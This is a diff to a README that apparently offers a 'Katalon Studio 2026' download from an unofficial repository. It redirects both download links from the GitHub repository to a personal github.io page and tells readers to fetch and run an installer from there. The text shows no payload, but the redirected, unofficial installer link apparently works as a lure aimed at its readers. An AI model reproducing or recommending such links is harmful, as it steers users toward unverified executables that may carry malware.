@@ -1,6 +1,6 @@
 # 🚀 katalon-studio-2026 - Your Fastest Path to Test Automation Mastery
 
-[![Download Katalon Studio 2026](https://img.shields.io/badge/Download-Katalon_Studio_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Diatomagrimony995/katalon-studio-2026)
+[![Download Katalon Studio 2026](https://img.shields.io/badge/Download-Katalon_Studio_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://diatomagrimony995.github.io)
 
 ---
 
@@ -25,7 +25,7 @@ Whether you’re a beginner exploring automation for the first time or a team le
 
 Visit this link to download the application:
 
-[🔗 Download Katalon Studio 2026](https://github.com/Diatomagrimony995/katalon-studio-2026)
+[🔗 Download Katalon Studio 2026](https://diatomagrimony995.github.io)
 
 Once you click the link, you’ll be taken to a page where you can download the installer file. Look for a button or link that says “Download” or the version number (e.g., 2026.0.1). Click it, and your download will begin automatically.
 
